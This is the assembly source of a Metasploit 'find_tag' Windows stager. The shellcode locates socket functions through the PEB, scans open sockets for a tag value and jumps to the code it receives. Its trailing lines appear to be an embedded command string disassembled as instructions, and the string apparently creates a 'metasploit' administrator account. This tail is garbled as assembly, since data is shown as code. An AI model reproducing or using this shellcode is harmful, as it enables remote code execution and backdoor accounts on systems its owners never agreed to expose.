;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for find_tag (stager)
;
; Authors: hdm <hdm@metasploit.com>, vlad902 <vlad902@gmail.com>, skape <mmiller@hick.org>
; Size   : 178
;

cld
xor edi,edi
mov eax,[fs:edi+0x30]
mov eax,[eax+0xc]
mov ebx,[eax+0x1c]
mov ebx,[ebx]
mov esi,[ebx+0x20]
lodsd
lodsd
dec esi
add eax,[esi]
cmp eax,0x325f3332
jnz 0xd
mov ebp,[ebx+0x8]
mov eax,[ebp+0x3c]
mov ecx,[ebp+eax+0x78]
mov ecx,[ebp+ecx+0x1c]
mov ebx,[ecx+ebp+0x3c]
add ebx,ebp
add ebp,[ecx+ebp+0x24]
push edi
inc di
mov esi,esp
push esi
push dword 0x4004667f
push edi
call ebp
lodsd
test eax,eax
jz 0x37
cdq
push edx
mov dh,0xc
push edx
push esi
push edi
call ebx
lodsd
cmp eax,0x337a4b73
jnz 0x37
jmp esi
arpl [ebp+0x64],bp
gs js 0xc8
and [edi],ch
arpl [eax],sp
outsb
gs jz 0x8b
jnz 0xe0
gs jc 0x90
insd
gs jz 0xd5
jnc 0xe6
insb
outsd
imul esi,[eax+0x20],dword 0x4444412f
and [esi],ah
and [es:esi+0x65],ch
jz 0xa8
insb
outsd
arpl [ecx+0x6c],sp
a16 jc 0xff
jnz 0x102
and [ecx+0x64],al
insd
imul ebp,[esi+0x69],dword 0x61727473
jz 0x10e
jc 0x114
and [ebp+0x65],ch
jz 0x107
jnc 0x118
insb
outsd
imul esi,[eax+0x2f],dword 0x444441
